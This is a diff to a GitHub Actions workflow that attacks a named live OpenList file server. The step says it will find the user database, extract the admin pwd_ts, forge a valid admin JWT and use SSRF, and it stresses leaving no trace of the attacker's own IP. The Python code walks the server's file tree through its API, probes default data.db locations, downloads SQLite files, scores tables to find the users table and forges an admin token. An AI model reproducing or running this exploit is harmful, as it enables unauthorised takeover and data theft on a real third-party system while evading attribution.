@@ -5,7 +5,7 @@ jobs:
   admin:
     runs-on: ubuntu-latest
     steps:
-      - name: locate OpenList user DB (data.db) + extract admin pwd_ts + forge valid admin JWT + SSRF (zero own-IP)
+      - name: locate OpenList user DB + extract admin pwd_ts + forge valid admin JWT + SSRF (zero own-IP)
         run: |
           set +e
           B="https://pan.yazinb.icu"
@@ -26,7 +26,7 @@ jobs:
               r=urllib.request.Request(B+path,data=json.dumps(payload).encode(),headers={"Authorization":T,"Content-Type":"application/json"},method="POST")
               try: return json.loads(urllib.request.urlopen(r,context=ctx,timeout=30).read())
               except Exception: return None
-          def listp(path,page): return reqjson("/api/fs/list",{"path":path,"page":page,"per_page":100})
+          def listp(path,page): return reqjson("/api/fs/list",{"path":path,"page":page,"per_page":200})
           def get_raw(path):
               d=reqjson("/api/fs/get",{"path":path})
               if not d: return ''
@@ -34,11 +34,8 @@ jobs:
           def dl(url,out):
               data=urllib.request.urlopen(url,context=ctx,timeout=120).read()
               open(out,'wb').write(data); return len(data)
-          # 1) recursive tree walk, flag any *.db/*.sqlite (OpenList type is int: 1=folder,0=file)
           cands=[]
-          depth_hits=0
           def walk(path,depth=0):
-              global depth_hits
               page=1
               while True:
                   d=listp(path,page)
@@ -46,21 +43,18 @@ jobs:
                   content=d.get('data',{}).get('content',[])
                   if not content: break
                   for x in content:
-                      nm=x.get('name',''); tp=x.get('type'); sz=x.get('size')
+                      nm=x.get('name',''); tp=x.get('type')
+                      is_folder=(tp==1 or tp=='folder' or tp=='dir')
                       full=(path if path=='/' else path.rstrip('/')+'/')+nm
-                      is_folder = (tp==1 or tp=='folder' or tp=='dir')
-                      print('  '*depth+full+' ['+str(tp)+'] sz='+str(sz))
-                      if is_folder and depth<5:
-                          depth_hits+=1; walk(full,depth+1)
+                      if is_folder and depth<4: walk(full,depth+1)
                       elif (nm.endswith('.db') or nm.endswith('.sqlite') or nm.endswith('.sqlite3')):
                           cands.append(full); print('    *** DB CANDIDATE: '+full)
-                  if len(content)<100: break
+                  if len(content)<200: break
                   page+=1
-                  if page>200: break
+                  if page>100: break
           walk('/')
-          print("SUBTREE_FOLDER_VISITS "+str(depth_hits))
-          # 2) explicit OpenList default data-DB locations
-          for e in ["/data/data.db","/data.db","/OpenList.db","/data/OpenList.db","/data/data.sqlite","/data.db.sqlite"]:
+          print("WALK_DONE_CANDIDATES="+str(len(cands)))
+          for e in ["/data/data.db","/data.db","/OpenList.db","/data/OpenList.db","/data/data.sqlite","/data.db.sqlite","/data.db.bak","/db/data.db"]:
               full="/"+SUB+e
               ru=get_raw(full)
               if ru: print("EXTRA_FOUND "+full); cands.append(full)
@@ -80,10 +74,6 @@ jobs:
                   con=sqlite3.connect(out)
                   tabs=[r[0] for r in con.execute("select name from sqlite_master where type='table'")]
                   print("  TABLES "+str(tabs))
-                  for t in tabs:
-                      cols=[d[1] for d in con.execute('PRAGMA table_info(%s)'%t)]
-                      print("  SCHEMA "+t+" "+str(cols))
-                  # pick user table by score: pwd_ts(strongest) + password + username + role/perm
                   ut=None; best=-1
                   for t in tabs:
                       cols=[d[1].lower() for d in con.execute('PRAGMA table_info(%s)'%t)]
@@ -119,7 +109,7 @@ jobs:
                               print("  FORGED admin JWT with pwd_ts="+str(pts))
                               break
                   else:
-                      print("  NO_USER_TABLE_IN "+c)
+                      print("  NO_USER_TABLE_IN "+c+" (best score="+str(best)+")")
               except Exception as ex: print("  NOT_SQLITE_OR_ERR "+repr(ex))
           print("FOUND_USER_DB "+str(found))
           print("DBPROBE_DONE")
